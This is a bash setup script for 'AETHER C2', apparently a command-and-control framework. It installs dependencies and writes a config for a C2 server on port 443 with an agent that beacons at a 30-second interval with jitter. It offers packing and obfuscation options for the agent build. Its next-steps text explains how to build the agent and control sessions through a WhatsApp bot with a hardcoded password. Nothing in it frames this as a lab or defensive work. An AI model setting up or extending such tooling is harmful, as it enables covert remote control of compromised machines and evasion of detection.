#!/bin/bash

# AETHER Quick Start Script
# Simplified setup for immediate deployment

set -e

echo "═══════════════════════════════════════════════════════"
echo "   AETHER C2 Quick Start Setup"
echo "═══════════════════════════════════════════════════════"
echo ""

# Check Python
if ! command -v python3 &> /dev/null; then
    echo "✗ Python 3 not found. Please install Python 3.8+"
    exit 1
fi

echo "✓ Python $(python3 --version | awk '{print $2}')"

# Check Node.js
if ! command -v node &> /dev/null; then
    echo "⚠ Node.js not found. WhatsApp bot will not work."
    echo "  Install from: https://nodejs.org/"
else
    echo "✓ Node.js $(node --version)"
fi

# Check npm
if command -v npm &> /dev/null; then
    echo "✓ npm $(npm --version)"
fi

echo ""
echo "═══════════════════════════════════════════════════════"
echo "   Installing Python Dependencies"
echo "═══════════════════════════════════════════════════════"
echo ""

pip3 install -r requirements.txt --quiet

echo "✓ Python dependencies installed"
echo ""

# Install Node dependencies if npm available
if command -v npm &> /dev/null; then
    echo "═══════════════════════════════════════════════════════"
    echo "   Installing WhatsApp Bot Dependencies"
    echo "═══════════════════════════════════════════════════════"
    echo ""
    
    cd WA-BOT-Base
    npm install --silent
    cd ..
    
    echo "✓ WhatsApp bot dependencies installed"
    echo ""
fi

# Create .aether_config if doesn't exist
if [ ! -f ".aether_config.json" ]; then
    echo "═══════════════════════════════════════════════════════"
    echo "   Creating Default Configuration"
    echo "═══════════════════════════════════════════════════════"
    echo ""
    
    cat > .aether_config.json << 'CONFIGEOF'
{
  "timestamp": "2025-12-07T00:00:00",
  "quick_start": true,
  "server": {
    "c2_host": "0.0.0.0",
    "c2_port": 443,
    "c2_protocol": "https",
    "encryption_key": "CHANGE_THIS_TO_RANDOM_64_CHAR_STRING"
  },
  "agent": {
    "c2_host": "localhost",
    "c2_port": 443,
    "beacon_interval": 30,
    "jitter_percent": 20
  },
  "builder": {
    "output_name": "agent",
    "use_pyarmor": false,
    "use_upx": false,
    "obfuscation_level": "low"
  },
  "whatsapp": {
    "enabled": false
  }
}
CONFIGEOF
    
    echo "✓ Default configuration created"
    echo ""
fi

echo "═══════════════════════════════════════════════════════"
echo "   Setup Complete!"
echo "═══════════════════════════════════════════════════════"
echo ""
echo "📌 NEXT STEPS:"
echo ""
echo "1. Edit configuration:"
echo "   • config.json (main settings)"
echo "   • .aether_config.json (detailed config)"
echo ""
echo "2. Start AETHER Server:"
echo "   python3 server/aether_server.py"
echo ""
echo "3. Start WhatsApp Bot (optional):"
echo "   cd WA-BOT-Base && npm start"
echo "   (Scan QR code with WhatsApp)"
echo ""
echo "4. Build agent:"
echo "   python3 builder/compile.py"
echo ""
echo "5. Control via WhatsApp:"
echo "   Send: auth aether2025"
echo "   Send: sessions"
echo ""
echo "📖 Full guides:"
echo "   • COMPLETE_CONFIG_GUIDE.md"
echo "   • COMPLETE_DEPLOYMENT_GUIDE.md"
echo "   • WHATSAPP_BOT_INTEGRATION.md"
echo ""
